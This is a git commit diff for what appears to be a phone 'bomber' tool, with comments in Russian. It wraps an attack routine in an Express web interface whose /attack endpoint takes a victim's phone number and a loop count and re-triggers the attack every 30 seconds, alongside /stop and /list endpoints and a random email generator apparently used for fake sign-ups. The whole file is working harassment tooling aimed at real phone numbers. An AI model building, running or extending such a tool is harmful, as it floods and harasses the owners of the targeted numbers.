b87cc6468007f0d216a2af05e6683cceafeb6cc2
Nikita <belarussianhax@yandex.ru>
2021-04-11 14:28:00 +0300

    реворк веба, не поддерживает node.js api

--- index.js
+++ index.js
@@ -1,103 +1,111 @@
+const express = require('express');
+const arguments = require('yargs').argv;
+const open = require('open');
 const service = require("./core.js");
-var current_attacks = [];
-var list_attacks = [];
+const current_attacks = [];
+const list_attacks = [];
 
-/* 
-Иницилизация атаки
-    - number - номер телефона без знака "+" (Например: 79865329543)
-    - loop - количество повторов цикла атаки
-*/
+const app = express();
 
+if(arguments.port){
+    app.listen(arguments.port, function (){
+        console.log(`[INFO] Server started on ${arguments.port}`)
+        open(`http://localhost:${arguments.port}/`);
+    });
+}else{
+    app.listen(3000, function (){
+        console.log(`[INFO] Server started on 3000`)
+        open(`http://localhost:3000/`);
+    });
+}
 
-function attack(number, loop){
-    if(!Number(number) || number.toString().length < 11){
-            result = {
-                "success": false,
-                "text": `Номер телефона не указан либо не является корректным`
-            }
-        return result; 
+app.get('/', async (req, res) => {
+    app.use(express.static(__dirname + "/html/"));
+    res.sendFile(__dirname + "/html/index.html"); 
+});
+
+app.get('/attack', async (req, res) => {
+    if(!Number(req.query.number) || req.query.number.toString().length < 11){
+        return res.json({
+            "success": false,
+            "text": `Номер телефона не указан либо не является корректным`
+        });  
     }
-    if(!Number(loop) || !loop){
-        result = {
+    if(!Number(req.query.loops) || !req.query.loops){
+        return res.json({
             "success": false,
             "text": `Параментр loop отсутсвует либо не является корректным`
-        }
-        return result; 
+        }); 
     }else{
-        result = {
-            "success": true,
-            "text": `Атака на номер +${number} успешно запущена`
-        }
-    count = 0;
-
-    list_attacks.push({
-        number: Number(number),
-        loop: Number(loop),
-        startedAt: Date.now()/1000
-    })
-    
-    service.start(number);
-    // Девочки с восьмым марта
-    current_attacks[number] = setInterval(async function(){
-        service.start(number);
-                count++;
-                    if(count == loop - 1){
-                        clearInterval(current_attacks[number]);
-                        for(let key in list_attacks){
-                            if(list_attacks[key].number == number){
-                                list_attacks.splice(key, 1);
+        count = 0;
+        list_attacks.push({
+            number: Number(req.query.number),
+            loop: Number(req.query.loops),
+            startedAt: Date.now()
+        });
+        service.start(req.query.number);
+        current_attacks[req.query.number] = setInterval(async function(){
+            service.start(req.query.number);
+                    count++;
+                        if(count == req.query.loops - 1){
+                            clearInterval(current_attacks[req.query.number]);
+                            for(let key in list_attacks){
+                                if(list_attacks[key].number == req.query.number){
+                                    list_attacks.splice(key, 1);
+                                }
                             }
                         }
-                    }
-        }, 30000);
+            }, 30000);
+        return res.status(200).json({
+            "success": true,
+            "text": `Атака на номер +${req.query.number} успешно запущена`
+        });
     }
-    return result;
-}
+});
 
-/*
-Остановка атаки
-    - number - номер телефона без знака "+" (Например: 79865329543)
-*/
-function stop(number){
-    if(current_attacks[number]){
-        clearInterval(current_attacks[number]);
-        for(let key in list_attacks){
-            if(list_attacks[key].number == number){
-                list_attacks.splice(key, 1);
+app.get('/stop', async (req, res) => {
+    if(req.query.number){
+        if(current_attacks[req.query.number]){
+            clearInterval(current_attacks[req.query.number]);
+            for(let key in list_attacks){
+                if(list_attacks[key].number == req.query.number){
+                    list_attacks.splice(key, 1);
+                }
             }
+        res.status(200).json({
+            success: true,
+            text: `Атака на номер +${req.query.number} успешно прекращена`
+        });
+        }else{
+            return res.json({
+                success: false,
+                text: `Нет активных атак по номеру +${req.query.number}`
+            }); 
         }
-    result = {
-        success: true,
-        text: `Атака на номер +${number} успешно прекращена`
-    }
-    return result
     }else{
-        result = {
+        return res.json({
             success: false,
-            text: `Нет активных атак по номеру +${number}`
-        }
-    return result
+            text: `Параментр number не указал либо не является корректным`
+        }); 
     }
-}
+});
 
-/* 
-Возвращает список активных атак
-*/
-function list(){
+app.get('/list', async (req, res) => {
     if(list_attacks.length === 0){
         result = {
             success: false,
             text: `Список активных атак пуст`
         }
-    return result
+        return res.status(200).json(result);
     }else{
         result = {
             success: true,
             result: list_attacks
         }
-    return result
+        return res.status(400).json(result);
     }
-}
+});
+
 
 module.exports.mailGen = function(){
     let domains = ['@mail.ru', '@yandex.ru', '@gmail.com', '@rambler.ru']
@@ -120,4 +128,3 @@ function getRandomElement(arr) {
     return arr[rand];
 }
 
-module.exports = { list_attacks, current_attacks, attack, stop, list}
